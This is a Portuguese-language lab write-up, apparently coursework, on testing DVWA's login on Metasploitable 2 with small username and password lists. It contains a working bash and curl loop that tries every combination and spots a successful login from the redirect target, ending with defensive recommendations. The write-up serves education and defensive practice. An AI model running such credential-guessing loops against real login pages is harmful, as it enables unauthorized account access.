# 05 — Auditoria de autenticação Web com DVWA e Medusa

## 1. Objetivo

Realizar uma análise controlada de autenticação em uma aplicação web vulnerável, utilizando listas de usuários e senhas em um laboratório isolado.

## 2. Ambiente

- Máquina de auditoria: Kali Linux
- Máquina alvo: Metasploitable 2
- Aplicação: Damn Vulnerable Web Application (DVWA)
- Endereço: `http://192.168.56.102/dvwa/`
- Ferramentas: Medusa e curl

## 3. Preparação das listas

Foi criado o arquivo `users.txt` com os seguintes usuários:

```text
user
msfadmin
admin
root
```

O arquivo `pass.txt` foi criado com as seguintes senhas de teste:

```text
123456
password
qwerty
msfadmin
```

As listas foram verificadas com:

```bash
cat users.txt
cat pass.txt
```

## 4. Inspeção do formulário

Foi realizada uma inspeção da página de autenticação para identificar os campos utilizados pelo formulário.

Foram identificados:

- Campo de usuário: `username`
- Campo de senha: `password`
- Método de envio: `POST`
- Botão de envio: `Login`

O módulo HTTP tradicional do Medusa foi consultado, mas sua versão instalada não apresentava as opções `PAGE`, `FORM` e `FAIL` utilizadas no exemplo da aula.

Também foi consultado o módulo `web-form`. Durante a tentativa de utilização, o módulo apresentou dificuldade para interpretar a resposta HTTP 302 do DVWA.

## 5. Teste das combinações com curl

Para continuar a auditoria, foi utilizado o curl para enviar as combinações das duas listas e observar os redirecionamentos HTTP.

O teste foi executado no Kali:

```bash
while IFS= read -r usuario; do
    while IFS= read -r senha; do
        jar=$(mktemp)

        curl -s -c "$jar" \
        http://192.168.56.102/dvwa/login.php -o /dev/null

        destino=$(curl -s -D - -o /dev/null \
        -b "$jar" -c "$jar" \
        -d "username=$usuario&password=$senha&Login=Login" \
        http://192.168.56.102/dvwa/login.php |
        grep -i '^Location:' | tr -d '\r')

        echo "$usuario : $senha -> $destino"
        rm -f "$jar"
    done < pass.txt
done < users.txt
```

O procedimento testou 16 combinações: quatro usuários e quatro senhas.

## 6. Resultado observado

A maioria das combinações retornou:

```text
Location: login.php
```

Uma combinação apresentou comportamento diferente:

```text
admin : password -> Location: index.php
```

Esse redirecionamento é um forte indício de que a autenticação foi aceita, enquanto as demais combinações retornaram à página de login.

**Credencial indicada pelo teste:**

- Usuário: `admin`
- Senha: `password`

A confirmação visual do acesso ao painel autenticado deve ser realizada separadamente.

## 7. Análise técnica

O resultado demonstra como a diferença no comportamento HTTP pode ajudar a identificar uma tentativa de autenticação aceita.

O código HTTP 302 representa um redirecionamento. Neste teste, o destino `index.php` foi diferente do destino `login.php` observado nas demais tentativas.

O teste também demonstra que uma ferramenta de auditoria precisa interpretar corretamente as respostas da aplicação. O módulo `web-form` do Medusa não conseguiu processar adequadamente o redirecionamento 302 durante a tentativa realizada.

## 8. Recomendações de segurança

- Não utilizar credenciais padrão.
- Exigir senhas fortes e individuais.
- Implementar limitação de tentativas de autenticação.
- Adotar bloqueio temporário após várias tentativas malsucedidas.
- Monitorar tentativas repetidas de login.
- Utilizar mecanismos adicionais de autenticação quando aplicável.
- Evitar mensagens e comportamentos que facilitem a identificação de credenciais válidas.

## 9. Conclusão

A auditoria demonstrou a possibilidade de testar combinações de usuários e senhas em um ambiente controlado e identificar diferenças nas respostas HTTP da aplicação.

O resultado apontou a combinação `admin/password` como provável credencial válida para o DVWA. O exercício permitiu praticar inspeção de formulários, requisições POST, gerenciamento de cookies, análise de redirecionamentos e uso de listas de teste.

Todos os testes foram realizados no laboratório local com finalidade educacional.
